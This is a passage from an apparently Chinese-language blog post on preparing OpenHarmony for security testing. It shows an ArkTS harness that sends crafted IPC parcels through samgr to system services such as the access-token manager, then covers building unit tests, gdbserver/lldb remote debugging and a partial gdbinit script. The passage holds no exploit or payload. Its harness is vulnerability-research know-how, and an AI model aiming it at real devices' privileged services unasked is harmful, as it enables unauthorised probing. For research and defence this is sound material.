同时清理项目的<code>build-profile.json5</code>的<strong>signingConfigs</strong>的内容为 <code>&quot;signingConfigs&quot;:[],</code></p></li><li><p>在DevEco里,  <code>File -&gt; Project Structure-&gt;Project-&gt;Signing Configs</code>里设置自动签名.</p><p><img src="/images/OpenHarmony-test/1675149053919.png" alt="1675149053919"></p></li><li><p>最后编译好就可以直接安装测试了.</p></li></ol><h1 id="测试用例的生成"><a href="#测试用例的生成" class="headerlink" title="测试用例的生成"></a>测试用例的生成</h1><h2 id="使用DevEco生成测试用例"><a href="#使用DevEco生成测试用例" class="headerlink" title="使用DevEco生成测试用例"></a>使用DevEco生成测试用例</h2><p>这里需要感谢<strong>k0shl</strong>(<a href="https://twitter.com/keyz3r0?lang=en">@KeyZ3r0</a>)大佬的帮助, 找到了ipc的直接调用方法:</p><p>文件<code>xxx.ets</code>里: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">import rpc from &#x27;@ohos.rpc&#x27;</span><br><span class="line"></span><br><span class="line">@Entry</span><br><span class="line">@Component</span><br><span class="line">struct Index &#123;</span><br><span class="line">  @State message: string = &#x27;ipc Test&#x27;</span><br><span class="line">  @State result: string = &#x27;type to start&#x27;</span><br><span class="line">  @State button: string = &#x27;Start&#x27;</span><br><span class="line"></span><br><span class="line">  build() &#123;</span><br><span class="line">    Row() &#123;</span><br><span class="line">      Column() &#123;</span><br><span class="line">        Text(this.message)</span><br><span class="line">          .fontSize(40)</span><br><span class="line">          .fontWeight(FontWeight.Bold)</span><br><span class="line"></span><br><span class="line">        Text(this.result)</span><br><span class="line">          .fontSize(20)</span><br><span class="line">          .fontColor(Color.Red)</span><br><span class="line">          .fontWeight(FontWeight.Bold)</span><br><span class="line"></span><br><span class="line">        Button(this.button)</span><br><span class="line">          .fontSize(40)</span><br><span class="line">          .fontWeight(FontWeight.Bold)</span><br><span class="line">          .onClick(() =&gt; &#123;</span><br><span class="line">            let proxy = rpc.IPCSkeleton.getContextObject();//初始化一个local register service的IRemoteObject</span><br><span class="line">            if (proxy == null) &#123;</span><br><span class="line">              this.result = &quot;connect error&quot;;</span><br><span class="line">              return</span><br><span class="line">            &#125;</span><br><span class="line">            let data = rpc.MessageParcel.create();</span><br><span class="line">            data.writeInterfaceToken(&quot;ohos.samgr.accessToken&quot;); //固定值，是samgr的interface token</span><br><span class="line">            data.writeInt(3503); //想往哪个service发IPC消息，设定这个值，一般这个值在对应服务的头文件里, 比如软总线就是 SOFTBUS_SERVER_SA_ID_INNER 4700</span><br><span class="line">            data.writeBoolean(false); //默认为false</span><br><span class="line">            let reply = rpc.MessageParcel.create();</span><br><span class="line">            let opt = new rpc.MessageOption();</span><br><span class="line">            proxy.sendRequestAsync(2, data, reply, opt) //首先发送CheckSystemAbility到samgr</span><br><span class="line">              .then(value =&gt; &#123;</span><br><span class="line">                if(value.errCode != 0)&#123;</span><br><span class="line">                  this.result = &quot;send request failed. errcode: &quot; + value.errCode</span><br><span class="line">                  return</span><br><span class="line">                &#125;</span><br><span class="line">                let atproxy = reply.readRemoteObject(); //若成功，返回的MessageParcel reply会包含目标服务的IRemoteObject</span><br><span class="line">                let atdata = rpc.MessageParcel.create();</span><br><span class="line">                let atreply = rpc.MessageParcel.create();</span><br><span class="line">                atdata.writeInterfaceToken(&quot;test&quot;); //构造目标服务想测试的interface的MessageParcel, 具体参考目标服务如何解析的数据</span><br><span class="line">                atdata.writeInt(0xdeadbeef);</span><br><span class="line">                atdata.writeString(&quot;test&quot;);</span><br><span class="line">                this.result = &quot;finish1&quot;</span><br><span class="line">                let atopt = new rpc.MessageOption();</span><br><span class="line">                atproxy.sendRequestAsync(0xff10, atdata, atreply, atopt).then(result =&gt; &#123; //发送测试数据给目标服务，SendRequest的第一个参数为目标服务的接口，</span><br><span class="line">                  //是一个enumerate，可以从目标服务目录的头文件里找到，</span><br><span class="line">                  //比如/home/user/Desktop/code-v3.2-Beta4/OpenHarmony/base/security/access_token/frameworks/accesstoken/include/i_accesstoken_manager.h</span><br><span class="line">                  //路径里的enum class InterfaceCode</span><br><span class="line">                  this.result = &quot;finish222&quot;</span><br><span class="line">                  if(result.errCode == 0)&#123;</span><br><span class="line">                    this.result = &quot;finish all&quot;</span><br><span class="line">                    return</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">              &#125;).catch(function(e)&#123;</span><br><span class="line">              this.result = &quot;catch exception. error:&quot; + e;</span><br><span class="line">              return</span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      .width(&#x27;100%&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">    .width(&#x27;100%&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述示例实现了一个 ipc 消息发送操作.</p><blockquote><p>截止 2023&#x2F;1&#x2F;31, Openharmony的sdk里, <code>MessageParcel</code>接口不支持writeCString. 如果需要写入字符串, 可以考虑用 <code>writeInt</code> 替代, 因为写入字符串也是4字节对齐的, 而CString的方式相当于写Int.</p></blockquote><h2 id="使用原始测试组件生成测试用例"><a href="#使用原始测试组件生成测试用例" class="headerlink" title="使用原始测试组件生成测试用例"></a>使用原始测试组件生成测试用例</h2><p>OpenHarmony自带google test, 如果要测试, 也可以通过修改自带的测试用例来实现我们的需求.</p><ol><li><p>在<code>OpenHarmony/foundation/communication/dsoftbus/tests/BUILD.gn</code>添加新的测试用例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">features += [</span><br><span class="line">  &quot;sdk/discovery/unittest:DiscSdkTest&quot;,// 这个默认就有</span><br><span class="line">  &quot;sdk/transmission/trans_channel:TransSdkTest&quot;,</span><br><span class="line">  &quot;adapter/unittest:AdapterTest&quot;,</span><br><span class="line">  &quot;sdk/bus_center/unittest:BusCenterSdkTest&quot;,// 如果我添加这个, 后面生成的命令就需要换成 ./build.sh --product-name rk3568 --build-target BusCenterSdkTest</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>测试用例所在目录的<code>build.gn</code>的解读:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bus_center_sdk_test_src = [ &quot;bus_center_sdk_test.cpp&quot; ]// 源码文件之一</span><br><span class="line">...</span><br><span class="line">  ohos_unittest(&quot;BusCenterSdkTest&quot;) &#123;// 添加用例的名称</span><br><span class="line">    module_out_path = module_output_path</span><br><span class="line">    sources = bus_center_sdk_test_src// 涉及到的源码文件</span><br><span class="line">    include_dirs = bus_center_sdk_test_inc</span><br><span class="line">    include_dirs += [</span><br><span class="line">      &quot;unittest/common/&quot;,</span><br><span class="line">      &quot;//utils/native/base/include&quot;,</span><br><span class="line">    ]</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>使用<code>./build.sh --product-name rk3568 --build-target DiscSdkTest --target-cpu arm64 --ccache </code>生成测试用例</p><p>生成位置<code>OpenHarmony/out/rk3568/tests/unittest/dsoftbus/discovery/DiscSdkTest</code>(此版本是stripped的版本, 但是有函数名称, 如果没有, 说明IDA版本过低)</p><blockquote><p>为了方便调试, 可以在<code>OpenHarmony/out/rk3568/exe.unstripped/tests/unittest/dsoftbus/discovery/DiscSdkTest </code>位置找到<code>not stripped</code>的版本.</p></blockquote></li></ol><h1 id="调试器调试"><a href="#调试器调试" class="headerlink" title="调试器调试"></a>调试器调试</h1><h2 id="64位系统的调试"><a href="#64位系统的调试" class="headerlink" title="64位系统的调试"></a>64位系统的调试</h2><p>在<a href="https://github.com/hugsy/gdb-static">gdb-static</a>下载gdbserver, 然后在ubuntu编译一个支持aarch64的gdb.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install python-dev</span><br><span class="line">$ <span class="built_in">mkdir</span> build</span><br><span class="line">$ <span class="built_in">mkdir</span> out</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ ../configure --build=x86_64-pc-linux-gnu -target=aarch64-linux-gnu --prefix=/home/vv/gdb-8.2.1/out --with-python</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure><p>在机器上操作连接wifi网络, 使用gdbserver启动程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./gdbserver-8.3.1-aarch64-le 192.168.1.4:1234 ./BusCenterSdkTest</span><br></pre></td></tr></table></figure><p>在Ubuntu使用编译的gdb连接程序:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./aarch64-linux-gnu-gdb</span><br></pre></td></tr></table></figure><p>为了方便调试, 可以使用文末的gdb脚本.</p><h2 id="32位系统的调试-不建议-可以忽略此节"><a href="#32位系统的调试-不建议-可以忽略此节" class="headerlink" title="32位系统的调试(不建议, 可以忽略此节)"></a>32位系统的调试(不建议, 可以忽略此节)</h2><p>尝试过使用编译的gdb调试(参考<a href="https://ost.51cto.com/posts/16933">编译gdb</a>), 但是rk3568的32位版本的内核实现有点问题, 会在某些syscall调用中失败. 因此建议使用lldb调试. OpenHarmony SDK会带lldb调试器, <code>C:\Users\xx\AppData\Local\OpenHarmony\Sdk\9\native\llvm\lib\clang\12.0.1\bin\arm-linux-ohos\lldb-server</code>(它也有64位的)</p><p><a href="/otherfile/lldb-server.7z">点击此处下载</a></p><ol><li><p>获取<code>hdc_std</code>工具, 可以<a href="https://gitee.com/isrc_ohos/hdc-tool">网上下载</a>, 安装了SDK也会自带<code>C:\Users\vv\AppData\Local\OpenHarmony\Sdk\9\toolchains\hdc_std.exe</code>.</p></li><li><p>传递lldb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; .\hdc_std.exe list targets 查看设备</span><br><span class="line">7001005458323933328a268f9c7f3900</span><br><span class="line">&gt; .\hdc_std.exe file send D:\lldb-server /data 将本地文件传递到设备的/data目录</span><br><span class="line">FileTransfer finish, Size:xxx, File count = 1, time:16ms rate:1245.38kB/s</span><br><span class="line">&gt; .\hdc_std.exe shell 进入设备shell</span><br><span class="line"># cd /data 进入/data目录</span><br><span class="line"># mkdir test 新建目录便于测试</span><br><span class="line"># chmod +x ./lldb_server</span><br><span class="line"># ./lldb-server platform --listen &quot;*:1234&quot; --server 前提是设备的wifi有连接</span><br></pre></td></tr></table></figure></li><li><p>使用<code>C:\Users\vv\AppData\Local\OpenHarmony\Sdk\9\native\llvm\bin\lldb.exe</code>或者Ubuntu的lldb连接目标server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; .\lldb.exe --arch thumbv7</span><br><span class="line">(lldb) platform select remote-linux</span><br><span class="line">  Platform: remote-linux</span><br><span class="line"> Connected: no</span><br><span class="line">(lldb) platform connect connect://192.168.1.8:1234</span><br><span class="line">  Platform: remote-freebsd</span><br><span class="line">    Triple: arm-unknown-linux-unknown</span><br><span class="line">OS Version: 5.10.93 (5.10.93)</span><br><span class="line">  Hostname: localhost</span><br><span class="line"> Connected: yes</span><br><span class="line">WorkingDir: /</span><br><span class="line">    Kernel: #1 SMP Wed Dec 7 15:20:41 CST 2022</span><br><span class="line">(lldb) platform set -w /data/test 设置测试目录为我们刚创建的test目录</span><br><span class="line">(lldb) file ./DiscSdkTest 执行run的时候会将本地文件DiscSdkTest放置到目标目录</span><br><span class="line">(lldb) run 开始运行</span><br></pre></td></tr></table></figure><blockquote><p>目前32位的系统的lldb存在thumb识别问题, 调试会有很大问题.</p></blockquote></li></ol><h1 id="gdbinit-for-aarch64"><a href="#gdbinit-for-aarch64" class="headerlink" title="gdbinit for aarch64"></a>gdbinit for aarch64</h1><p>因为自带的gdb比较简单, 这里我生成一个gdbinit, 方便查看内存和寄存器, 以及单步. </p><p>使用时, 在~&#x2F;.gdbinit添加以下内容即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br></pre></td><td class="code"><pre><span class="line">set architecture aarch64</span><br><span class="line">set $64BITS=1</span><br><span class="line">set $ARM=1</span><br><span class="line">set $SHOW_CONTEXT=1</span><br><span class="line">define ascii_char</span><br><span class="line">    if $argc != 1</span><br><span class="line">        help ascii_char</span><br><span class="line">    else</span><br><span class="line">        # thanks elaine :)</span><br><span class="line">        set $_c = *(unsigned char *)($arg0)</span><br><span class="line">        if ($_c &lt; 0x20 || $_c &gt; 0x7E)</span><br><span class="line">            printf &quot;.&quot;</span><br><span class="line">        else</span><br><span class="line">            printf &quot;%c&quot;, $_c</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document ascii_char</span><br><span class="line">Print ASCII value of byte at address ADDR.</span><br><span class="line">Print &quot;.&quot; if the value is unprintable.</span><br><span class="line">Usage: ascii_char ADDR</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define hex_quad</span><br><span class="line">    if $argc != 1</span><br><span class="line">        help hex_quad</span><br><span class="line">    else</span><br><span class="line">        printf &quot;%02X %02X %02X %02X %02X %02X %02X %02X&quot;, \</span><br><span class="line">               *((unsigned char*)$arg0), *((unsigned char*)$arg0 + 1),     \</span><br><span class="line">               *((unsigned char*)$arg0 + 2), *((unsigned char*)$arg0 + 3), \</span><br><span class="line">               *((unsigned char*)$arg0 + 4), *((unsigned char*)$arg0 + 5), \</span><br><span class="line">               *((unsigned char*)$arg0 + 6), *((unsigned char*)$arg0 + 7)</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document hex_quad</span><br><span class="line">Print eight hexadecimal bytes starting at address ADDR.</span><br><span class="line">Usage: hex_quad ADDR</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define hex_dword</span><br><span class="line">    if $argc != 1</span><br><span class="line">        help hex_dword</span><br><span class="line">    else</span><br><span class="line">        printf &quot;0x%08X 0x%08X 0x%08X 0x%08X&quot;, \</span><br><span class="line">               *(unsigned int*)($arg0), *(unsigned int*)((char*)$arg0 + 4),     \</span><br><span class="line">               *(unsigned int*)((char*)$arg0 + 8), *(unsigned int*)((char*)$arg0 + 0xc)</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document hex_dword</span><br><span class="line">Print eight hexadecimal bytes starting at address ADDR.</span><br><span class="line">Usage: hex_dword ADDR</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define hex_qword</span><br><span class="line">    if $argc != 1</span><br><span class="line">        help hex_qword</span><br><span class="line">    else</span><br><span class="line">        printf &quot;0x%016llX 0x%016llX&quot;, \</span><br><span class="line">               *(unsigned long long*)($arg0), *(unsigned long long*)((char*)$arg0 + 8)</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document hex_qword</span><br><span class="line">Print eight hexadecimal bytes starting at address ADDR.</span><br><span class="line">Usage: hex_qword ADDR</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define hexdump</span><br><span class="line">    if $argc != 1</span><br><span class="line">        help hexdump</span><br><span class="line">    else</span><br><span class="line">        echo \033[1m</span><br><span class="line">        if ($64BITS == 1)</span><br><span class="line">         printf &quot;0x%016lX : &quot;, $arg0</span><br><span class="line">        else</span><br><span class="line">         printf &quot;0x%08X : &quot;, $arg0</span><br><span class="line">        end</span><br><span class="line">        echo \033[0m</span><br><span class="line">        hex_quad $arg0</span><br><span class="line">        echo \033[1m</span><br><span class="line">        printf &quot; - &quot;</span><br><span class="line">        echo \033[0m</span><br><span class="line">        hex_quad $arg0+8</span><br><span class="line">        printf &quot; &quot;</span><br><span class="line">        echo \033[1m</span><br><span class="line">        ascii_char (char*)$arg0+0x0</span><br><span class="line">        ascii_char (char*)$arg0+0x1</span><br><span class="line">        ascii_char (char*)$arg0+0x2</span><br><span class="line">        ascii_char (char*)$arg0+0x3</span><br><span class="line">        ascii_char (char*)$arg0+0x4</span><br><span class="line">        ascii_char (char*)$arg0+0x5</span><br><span class="line">        ascii_char (char*)$arg0+0x6</span><br><span class="line">        ascii_char (char*)$arg0+0x7</span><br><span class="line">        ascii_char (char*)$arg0+0x8</span><br><span class="line">        ascii_char (char*)$arg0+0x9</span><br><span class="line">        ascii_char (char*)$arg0+0xA</span><br><span class="line">        ascii_char (char*)$arg0+0xB</span><br><span class="line">        ascii_char (char*)$arg0+0xC</span><br><span class="line">        ascii_char (char*)$arg0+0xD</span><br><span class="line">        ascii_char (char*)$arg0+0xE</span><br><span class="line">        ascii_char (char*)$arg0+0xF</span><br><span class="line">        echo \033[0m</span><br><span class="line">        printf &quot;\n&quot;</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">document hexdump</span><br><span class="line">Display a 16-byte hex/ASCII dump of memory at address ADDR.</span><br><span class="line">Usage: hexdump ADDR</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define hexDwordDump</span><br><span class="line">    if $argc != 1</span><br><span class="line">        help hexDwordDump</span><br><span class="line">    else</span><br><span class="line">        echo \033[1m</span><br><span class="line">        if ($64BITS == 1)</span><br><span class="line">         printf &quot;0x%016lX : &quot;, $arg0</span><br><span class="line">        else</span><br><span class="line">         printf &quot;0x%08X : &quot;, 